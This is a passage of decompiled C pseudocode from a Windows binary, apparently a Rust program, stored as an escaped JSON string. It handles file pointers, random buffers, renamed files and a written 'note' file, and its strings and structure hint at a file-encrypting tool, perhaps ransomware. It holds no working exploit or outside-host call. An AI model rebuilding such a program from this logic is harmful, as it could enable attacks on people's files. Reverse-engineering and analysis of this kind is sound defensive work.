int)(int)v93;\n      if ( v93 < 0.0 )\n        v114 = 0i64;\n      if ( v93 > 1.8446743e19 )\n        v114 = -1i64;\n      lpNewFileName[0] = (LPCWSTR)v114;\n      sub_140035E90((union _LARGE_INTEGER *)NewFilePointer, v35, 1i64, 0i64);\n      sub_1400010FE(\n        NewFilePointer[0].m128i_i64[0],\n        NewFilePointer[0].m128i_i64[1],\n        (__int64)\"TODO: panic message\",\n        19i64,\n        (__int64)&off_140060AA8);\n      RandomBuffer[0].m128i_i64[0] = v114;\n      sub_14002D440(NewFilePointer[0].m128i_i64, v35, RandomBuffer, 8ui64);\n      sub_1400010C6(NewFilePointer[0].m128i_i64[0], NewFilePointer[0].m128i_i64[1], (__int64)&off_140060AC0);\n      if ( (unsigned __int64)qword_140087B48 >= 5 )\n      {\n        RandomBuffer[0].m128i_i64[0] = (__int64)v195;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_140033450;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060AF0;\n        NewFilePointer[0].m128i_i64[1] = 2i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[1].m128i_i64[0] = (__int64)lpNewFileName;\n        RandomBuffer[1].m128i_i64[1] = (__int64)sub_140001000;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 2i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 106);\n      }\n      *(__m128i *)&v191[16] = _mm_loadu_si128(&v149);\n      *(__m128i *)v191 = v148;\n      v7 = v92;\n      v6 = v87;\n      if ( (unsigned __int64)qword_140087B48 >= 5 )\n      {\n        RandomBuffer[0].m128i_i64[0] = (__int64)v195;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_140033450;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060B30;\n        NewFilePointer[0].m128i_i64[1] = 2i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[1].m128i_i64[0] = (__int64)v191;\n        RandomBuffer[1].m128i_i64[1] = (__int64)sub_14000973B;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 2i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 109);\n      }\n      sub_14002D440(NewFilePointer[0].m128i_i64, v35, v191, 0x20ui64);\n      sub_1400010C6(NewFilePointer[0].m128i_i64[0], NewFilePointer[0].m128i_i64[1], (__int64)&off_140060B50);\n      sub_140039CF0(\n        (__int128 *)NewFilePointer[0].m128i_i8,\n        (const __m128i *)v195[0],\n        v196,\n        (unsigned __int8 *)\"powerranges.txtAdd \",\n        15i64);\n      v115 = (void *)NewFilePointer[0].m128i_i64[0];\n      v116 = sub_140035C60((char *)NewFilePointer[0].m128i_i64[0], NewFilePointer[1].m128i_i64[0]);\n      sub_14004AA27(v115, NewFilePointer[0].m128i_i64[1]);\n      sub_140001138((__int64)v116, (__int64)\"note write fail\", 15i64, (__int64)&off_1400615F8);\n      si128 = v85;\n      if ( (unsigned __int64)qword_140087B48 > 3 )\n      {\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_140061620;\n        NewFilePointer[0].m128i_i64[1] = 1i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[0].m128i_i64[0] = (__int64)v195;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_140033450;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_140009CB8((__int64)NewFilePointer, 4i64, (__int128 *)&off_140067880, 112);\n      }\n      v47 = 0i64;\n      v2 = _mm_load_si128(&v190);\n    }\nLABEL_214:\n    sub_14004AA27(v185, v167);\n    sub_14004AA27(v184, v166);\n    sub_1400097BF((__int64)v156);\nLABEL_215:\n    CloseHandle(v35);\n    v35 = (WCHAR *)v47;\nLABEL_216:\n    sub_14004AA27(*(void **)&v154[0], *((__int64 *)&v154[0] + 1));\nLABEL_217:\n    sub_14004AA27(v195[0], (__int64)v195[1]);\n    if ( v35 )\n    {\n      lpNewFileName[0] = v35;\n      if ( (unsigned __int64)qword_140087B48 >= 5 )\n      {\n        sub_14000116A((__int64)RandomBuffer, (__int64)&v180);\n        *(_QWORD *)v191 = lpNewFileName;\n        *(_QWORD *)&v191[8] = sub_14002EA70;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_1400678D0;\n        NewFilePointer[0].m128i_i64[1] = 2i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        *(_QWORD *)&v191[16] = RandomBuffer;\n        *(_QWORD *)&v191[24] = sub_140033450;\n        NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n        NewFilePointer[1].m128i_i64[1] = 2i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 145);\n        sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n      }\n      if ( (unsigned __int64)qword_140087B48 >= 5 )\n      {\n        sub_14000116A((__int64)RandomBuffer, (__int64)&v180);\n        *(_QWORD *)v191 = lpNewFileName;\n        *(_QWORD *)&v191[8] = sub_14002EA70;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_1400678D0;\n        NewFilePointer[0].m128i_i64[1] = 2i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        *(_QWORD *)&v191[16] = RandomBuffer;\n        *(_QWORD *)&v191[24] = sub_140033450;\n        NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n        NewFilePointer[1].m128i_i64[1] = 2i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 149);\n        sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n      }\n      if ( (unsigned __int64)qword_140087B48 > 4 )\n      {\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_14006E000;\n        NewFilePointer[0].m128i_i64[1] = 1i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[0].m128i_i64[0] = (__int64)lpNewFileName;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_14002EA70;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 150);\n      }\n      v127 = lpNewFileName[0];\n      if ( ((__int64)lpNewFileName[0] & 3) == 1 )\n      {\n        v128 = *(void **)((char *)lpNewFileName[0] - 1);\n        v129 = *(_QWORD *)((char *)lpNewFileName[0] + 7);\n        (*(void (__fastcall **)(void *))v129)(v128);\n        if ( *(_QWORD *)(v129 + 8) )\n          sub_1400015D0(v128, *(_QWORD *)(v129 + 16));\n        sub_1400015D0((char *)v127 - 1, 8ui64);\n      }\n    }\n    if ( (unsigned __int64)qword_140087B48 > 4 )\n    {\n      NewFilePointer[0].m128i_i64[0] = (__int64)&off_140067900;\n      NewFilePointer[0].m128i_i64[1] = 1i64;\n      NewFilePointer[2].m128i_i64[0] = 0i64;\n      RandomBuffer[0].m128i_i64[0] = (__int64)&v180;\n      RandomBuffer[0].m128i_i64[1] = (__int64)sub_140033450;\n      NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n      NewFilePointer[1].m128i_i64[1] = 1i64;\n      sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 153);\n    }\n    sub_14004AA27((void *)v180, *((__int64 *)&v180 + 1));\n    v4 = v172;\n  }\n  sub_14004AA27(v22, v162.m128i_i64[1]);\n  if ( (unsigned __int64)qword_140087B48 >= 5 )\n  {\n    NewFilePointer[0].m128i_i64[0] = (__int64)&off_140067910;\n    NewFilePointer[0].m128i_i64[1] = 1i64;\n    NewFilePointer[1].m128i_i64[0] = (__int64)&off_14006E000;\n    *(__m128i *)((char *)&NewFilePointer[1] + 8) = 0i64;\n    sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 135);\n  }\n  sub_14004AA27((void *)v180, *((__int64 *)&v180 + 1));\n  return sub_14000101F(&v172);\n}\n// 14001107E: control flows out of bounds to 140011082\n// 1400111C8: control flows out of bounds to 1400111CC\n// 14000EFAA: variable 'v11' is possibly undefined\n// 14000F033: variable 'v13' is possibly undefined\n// 14000F31B: variable 'v27' is possibly undefined\n// 14000F31B: variable 'v26' is possibly undefined\n// 14000F31B: variable 'v28' is possibly undefined\n// 14000F43A: variable 'v31' is possibly undefined\n// 14000F47B: variable 'v32' is possibly undefined\n// 14000F864: variable 'v46' is possibly undefined\n// 14000F979: variable 'v49' is possibly undefined\n// 14000F9FB: variable 'v52' is possibly undefined\n// 14000FA1E: variable 'v55' is possibly undefined\n// 14000FF17: variable 'v3' is possibly undefined\n// 14000FEDF: variable 'v2' is possibly undefined\n// 140010242: variable 'v81' is possibly undefined\n// 140010272: variable 'v84' is possibly undefined\n// 140010365: variable 'v86' is possibly undefined\n// 1400109AF: variable 'v104' is possibly undefined\n// 140010A05: variable 'v108' is possibly undefined\n// 140060600: using guessed type __int128 xmmword_140060600;\n// 140060610: using guessed type __int128 xmmword_140060610;\n// 1400606D8: using guessed type void *off_1400606D8;\n// 140060710: using guessed type void **off_140060710;\n// 140060740: using guessed type char *off_140060740;\n// 1400607E0: using guessed type char *off_1400607E0;\n// 140060810: using guessed type void **off_140060810;\n// 140060830: using guessed type char *off_140060830;\n// 140060868: using guessed type char *off_140060868;\n// 140060898: using guessed type void **off_140060898;\n// 1400608C8: using guessed type char *off_1400608C8;\n// 1400608F0: using guessed type char *off_1400608F0;\n// 140060940: using guessed type char *off_140060940;\n// 140060970: using guessed type char *off_140060970;\n// 1400609A0: using guessed type char *off_1400609A0;\n// 1400609B8: using guessed type char *off_1400609B8;\n// 1400609D0: using guessed type char *off_1400609D0;\n// 1400609E8: using guessed type char *off_1400609E8;\n// 140060A00: using guessed type char *off_140060A00;\n// 140060A50: using guessed type char *off_140060A50;\n// 140060AA8: using guessed type char *off_140060AA8;\n// 140060AC0: using guessed type char *off_140060AC0;\n// 140060AF0: using guessed type char *off_140060AF0;\n// 140060B30: using guessed type char *off_140060B30;\n// 140060B50: using guessed type char *off_140060B50;\n// 1400615F8: using guessed type char *off_1400615F8;\n// 140061620: using guessed type char *off_140061620;\n// 140065C48: using guessed type char *off_140065C48;\n// 140065C60: using guessed type char *off_140065C60;\n// 140065C78: using guessed type unsigned __int64 qword_140065C78[5];\n// 1400677F8: using guessed type char *off_1400677F8;\n// 140067810: using guessed type char *off_140067810;\n// 140067850: using guessed type void *off_140067850;\n// 140067880: using guessed type char *off_140067880;\n// 1400678D0: using guessed type char *off_1400678D0;\n// 140067900: using guessed type void *off_140067900;\n// 140067910: using guessed type char *off_140067910;\n// 140067928: using guessed type void *off_140067928;\n// 140068258: using guessed type __int64 (__fastcall *off_140068258)();\n// 1400682B8: using guessed type char *off_1400682B8;\n// 140068328: using guessed type char *off_140068328;\n// 14006B2E8: using guessed type char *off_14006B2E8;\n// 14006B300: using guessed type void *off_14006B300;\n// 14006E000: using guessed type void *off_14006E000;\n// 14006E188: using guessed type _QWORD qword_14006E188[3840];\n// 140087B48: using guessed type __int64 qword_140087B48;\n// 14000EEA9: using guessed type _DWORD var_417[3];\n// 14000EEA9: using guessed type unsigned __int64 var_378[17];\n// 14000EEA9: using guessed type unsigned __int64 var_3A0[5];\n// 14000EEA9: using guessed type _QWORD var_498[10];\n// 14000EEA9: using guessed type unsigned __int64 var_748[5];\n// 14000EEA9: using guessed type unsigned __int64 var_770[5];\n// 14000EEA9: using guessed type unsigned __int64 var_798[5];\n// 14000EEA9: using guessed type unsigned __int64 var_7C0[5];\n// 14000EEA9: using guessed type unsigned __int64 var_7E8[5];\n// 14000EEA9: using guessed type unsigned __int64 var_810[5];\n// 14000EEA9: using guessed type unsigned __int64 var_838[5];\n// 14000EEA9: using guessed type _QWORD var_888[5];\n// 14000EEA9: using guessed type __int64 var_8B0[5];\n\n"
    }
]